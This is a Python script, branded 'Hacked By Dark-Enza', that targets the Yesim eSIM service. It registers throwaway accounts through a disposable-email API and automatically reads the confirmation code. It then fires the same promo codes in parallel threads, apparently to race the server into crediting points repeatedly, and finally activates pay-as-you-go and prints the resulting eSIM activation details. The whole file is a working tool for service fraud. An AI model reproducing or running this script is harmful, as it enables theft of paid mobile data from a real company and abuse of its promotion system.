import requests
import time
import warnings
import sys
import threading

# ------- SSL hata ayıklaması için
# Yani konsoldan gizlemek için
def handle_warning(message, category, filename, lineno, file=None, line=None):
    if category == requests.packages.urllib3.exceptions.InsecureRequestWarning:
        pass

warnings.showwarning = handle_warning

with warnings.catch_warnings():
    warnings.simplefilter("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)


Y = "\033[38;2;0;255;0m"
K = "\033[38;2;255;0;0m"
T = "\033[38;2;255;128;0m"
R = "\033[0m"


#---------- Gövde Gösterisi :D -----#
print("\033[38;2;0;153;255m")
print("""
________              ______
___  __ \_____ __________  /__
__  / / /  __ `/_  ___/_  //_/
_  /_/ // /_/ /_  /   _  ,<
/_____/ \__,_/ /_/    /_/|_|
""")
print("\033[0m")

print("\033[38;2;255;128;0m")
print("                        ENZA")
print("\033[38;2;255;0;255m")
print("    By Hoqk4baZ")
print("\033[38;2;153;0;204m")
print("Çalıp Satanın Bacısına Dw-Chat Girsin")
print("\033[0m")

print("\033[0;38;2;153;0;204m")
print("TG: @dark_enza")
print("\033[0m")

print("\033[38;2;0;153;255m")
print("Yesim.. Hacked By Dark-Enza")
print("\033[0m")


# -------------------- eposta belirleme --------------------#
url1 = "https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1"
headers1 = {
    'Host': 'www.1secmail.com'
}
res1 = requests.get(url1, headers=headers1, verify=False)
sonuc1 = res1.json()
eposta = str(sonuc1).strip("['']")
print(Y+"[+]Eposta belirlendi:",eposta)
login = eposta
isim, domain = login.split('@')

# ------- belirlenen epostayı isteğe işle ----#
url2 = "https://iweb.yesim.app/v1/auth_email?email=" + eposta + "&version=4.1.8&lang=en&platform=3"
headers2 = {
	'Host': 'iweb.yesim.app'
	}
res2 = requests.post(url2, headers=headers2)
try:
	sonuc2 = res2.json()
	print(Y+"[+]Kod Gönderildi"+R)
except:
	print(K+"[-]Bir Hata meydana Geldi"+R)
	
	
#-------- kodu al ----------#
time.sleep(7)
url3 = "https://www.1secmail.com/api/v1/?action=getMessages&login="+isim+"&domain="+domain
headers3 = {
    'Host': 'www.1secmail.com'
}
res3 = requests.get(url3, headers=headers3, verify=False)
try:
	sonuc3 = res3.json()
	test = sonuc3[0]
	dogrula = test["subject"]
	kod = dogrula.replace('Your Yesim confirmation code: ', '')
	print(Y+"[*]Kod Alındı:",kod)
except:
	print(K+"[-]Alınamadı Tekrar Dene"+R)
	
	
	
#------- Alınan kodu işle ---------#
url4 = "https://iweb.yesim.app/v1/auth_code?code="+kod+"&email="+eposta+"&version=4.1.8&lang=en&platform=3"
headers4 = {
    'Host': 'iweb.yesim.app'
}
res4 = requests.post(url4, headers=headers4)
sonuc4 = res4.json()["sessionId"]


sys.stderr = open('/dev/null', 'w')
# ------------- Y Coin Çekme -----------#
urls = [
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=SHOPCASH&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=SUMMER23&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=SHOPCASH&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=SUMMER23&lang=en"
]

def make_request(url):
    res_puan = requests.get(url, verify=False)
    toplam = res_puan.json()[0]
    if toplam == 'success':
    	print(Y+"[+]500 Puan Eklendi"+R)
    else:
    	print(K+"•Puan Eklenemedi"+R)

threads = []
for url in urls:
    thread = threading.Thread(target=make_request, args=(url,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
    
time.sleep(5)

urls = [
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=XPEP156&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=XPEP156&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=XPEP156&lang=en",
    "https://api2.yesim.app/code_apply?ref_code&web_key=" + sonuc4 + "&ref_code=XPEP156&lang=en"
]

def make_request(url):
    res_puan = requests.get(url, verify=False)
    toplam = res_puan.json()[0]
    if toplam == 'success':
    	print(Y+"[+]200 Puan Eklendi"+R)
    else:
    	print(K+"•Puan Eklenemedi"+R)

threads = []
for url in urls:
    thread = threading.Thread(target=make_request, args=(url,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()


#--------------- Pay As You Go Aktifle -------#
time.sleep(5)
dark = requests.get("https://iweb.yesim.app/v1/activate_pay_as_you_go?web_key="+sonuc4+"&lang=en", timeout=5)
sonuc6 = dark.json()
if sonuc6 == "OK":
	print(Y+"[+]KareKod istendi "+R)
else:
	print(K+"[-]Karekod Alınamadı"+R)
	print(K+"Bir Sorun Var Admine Ulaş @dark_enza"+R)
	raise SystemExit()


#---------- Kare Kodu Denetle --------#
try:
    dark1 = requests.get("https://iweb.yesim.app/v1/show_my_qrs?web_key="+sonuc4+"&lang=en", timeout=5)
    sonuc7 = dark1.json()["Qrs"]
    aktivasyon = sonuc7[0][1]
    smdp = sonuc7[0][2]
    print(T+"[=]SM+DP Adresi: "+smdp)
    print(T+"[=]Aktivasyon Kodu: "+aktivasyon)
    print(T+"Android: LPA:1&"+smdp+"&"+aktivasyon)
except:
    console.set_color(1.0, 0.0, 0.0)
    print(K+"[-]KareKod Oluşturulamadı")
    print(K+"Bir Sorun Var Admine Ulaş @dark_enza")
    raise SystemExit()
